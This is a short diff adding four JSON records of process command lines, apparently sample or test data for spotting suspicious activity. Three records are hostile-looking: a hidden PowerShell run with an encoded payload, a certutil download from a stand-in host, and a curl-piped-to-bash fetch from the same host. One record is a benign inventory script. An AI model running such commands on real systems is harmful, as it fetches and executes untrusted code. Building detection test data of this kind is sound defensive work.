@@ -1,0 +1,4 @@
+{"id":"cm-0311-0201","command_line":"powershell.exe -nop -w hidden -enc JABz..."}
+{"id":"cm-0311-0650","command_line":"certutil.exe -urlcache -split -f http://cdn.stonewick.example/a.txt a.txt"}
+{"id":"cm-0312-0651","command_line":"curl -s http://cdn.stonewick.example/u.sh | bash"}
+{"id":"cm-0311-0652","command_line":"powershell.exe -File C:\\Scripts\\Inventory.ps1"}
